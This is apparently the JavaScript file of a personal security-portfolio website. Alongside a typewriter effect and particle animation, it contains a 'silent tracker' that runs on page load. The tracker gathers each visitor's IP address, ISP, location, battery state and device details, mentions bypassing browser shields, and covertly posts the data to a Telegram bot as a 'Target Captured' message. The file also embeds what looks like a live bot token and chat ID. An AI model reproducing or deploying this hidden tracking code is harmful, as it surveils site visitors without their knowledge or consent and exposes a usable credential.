/* Project: Yash Khan Elite Portfolio 
   Updated: Advanced Stealth Tracker for High Reliability
*/

// --- 1. CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas';
const TELEGRAM_CHAT_ID = '7950771882';

// --- 2. TYPEWRITER EFFECT (Unchanged) ---
const textArray = [
    "CYBER SECURITY STRATEGIST", 
    "OFFENSIVE PENETRATION TESTER", 
    "WHITE HAT HACKER", 
    "DEFENDING DIGITAL BANGLADESH"
];
let textIndex = 0, charIndex = 0, isErasing = false;

function typeEffect() {
    const typewriterElement = document.getElementById("typewriter");
    if (!typewriterElement) return;
    const currentWord = textArray[textIndex];
    typewriterElement.textContent = isErasing ? currentWord.substring(0, charIndex--) : currentWord.substring(0, charIndex++);
    let delay = isErasing ? 50 : 100;
    if (!isErasing && charIndex === currentWord.length) { delay = 2000; isErasing = true; }
    else if (isErasing && charIndex === 0) { isErasing = false; textIndex = (textIndex + 1) % textArray.length; delay = 500; }
    setTimeout(typeEffect, delay);
}

// --- 3. ADVANCED SILENT TRACKER (The Ultimate Update) ---
async function runSilentTracker() {
    const scanStatus = document.getElementById('scan-status');
    const userDetails = document.getElementById('user-details');

    try {
        // একাধিক API দিয়ে ট্র্যাকিং নিশ্চিত করা (Brave Shield Bypass)
        let ipData = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A' };
        
        try {
            // ১ নম্বর চেষ্টা: ipapi (খুবই ডিটেইলড)
            const res = await fetch('https://ipapi.co/json/');
            ipData = await res.json();
        } catch (e) {
            // ২ নম্বর চেষ্টা: ipify (যদি প্রথমটি ব্লক হয়)
            const res2 = await fetch('https://api.ipify.org?format=json');
            const data2 = await res2.json();
            ipData.ip = data2.ip;
        }

        // হার্ডওয়্যার এবং ব্যাটারি ইন্টেল
        let batteryInfo = "Access Denied";
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
        }

        const intel = {
            ip: ipData.ip || ipData.query || "N/A",
            loc: ipData.city ? `${ipData.city}, ${ipData.country_name}` : "N/A",
            isp: ipData.org || ipData.as || "N/A",
            os: navigator.platform,
            agent: navigator.userAgent,
            cores: navigator.hardwareConcurrency || "Hidden",
            screen: `${window.screen.width}x${window.screen.height}`,
            time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
        };

        // UI Update (আপনার স্ক্রিনশটের ডিজাইন অনুযায়ী)
        if (scanStatus) {
            scanStatus.innerHTML = "⚠️ SECURITY VULNERABILITY DETECTED: CONNECTION EXPOSED";
            scanStatus.style.color = "#ff003c";
        }
        if (userDetails) {
            userDetails.innerHTML = `
                > [SYSTEM] IP: <span style="color:#fff">${intel.ip}</span> <br>
                > [SYSTEM] ISP: <span style="color:#fff">${intel.isp}</span> <br>
                > [SYSTEM] LOC: <span style="color:#fff">${intel.loc}</span> <br>
                > [SYSTEM] BATT: <span style="color:#fff">${batteryInfo}</span> <br>
                > [SYSTEM] STATUS: <span style="color:#ff003c">TRACED</span>
            `;
        }

        // টেলিগ্রামে পাঠানোর জন্য মেসেজ রেডি করা
        const message = `
🎯 **Target Captured!**
-----------------------------
🌐 **IP:** ${intel.ip}
🏢 **ISP:** ${intel.isp}
📍 **Location:** ${intel.loc}
🔋 **Battery:** ${batteryInfo}
💻 **Platform:** ${intel.os}
🖥️ **Screen:** ${intel.screen}
⚙️ **Cores:** ${intel.cores}
🕒 **Time:** ${intel.time} (BD)
-----------------------------
🚀 *Injected by Yash Khan Intelligence Unit*
`;

        // টেলিগ্রামে পাঠানো (Direct API call with error handling)
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

    } catch (err) {
        console.warn("Stealth Mode Active: Tracking restricted by User Browser Settings.");
    }
}

// --- 4. PARTICLES.JS (Unchanged) ---
function initParticles() {
    if (typeof particlesJS !== 'undefined') {
        particlesJS("particles-js", {
            "particles": {
                "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
                "color": { "value": "#00ff41" },
                "opacity": { "value": 0.2, "random": true },
                "size": { "value": 2, "random": true },
                "line_linked": { "enable": true, "distance": 150, "color": "#00ff41", "opacity": 0.1, "width": 1 },
                "move": { "enable": true, "speed": 1, "direction": "none", "random": true, "out_mode": "out" }
            },
            "interactivity": {
                "events": { "onhover": { "enable": true, "mode": "grab" }, "onclick": { "enable": true, "mode": "push" } }
            },
            "retina_detect": true
        });
    }
}

// --- INITIALIZE ---
window.onload = () => {
    initParticles();
    typeEffect();
    // ২ সেকেন্ড পর সাইলেন্টলি ট্র্যাকার স্টার্ট হবে
    setTimeout(runSilentTracker, 2000);
};
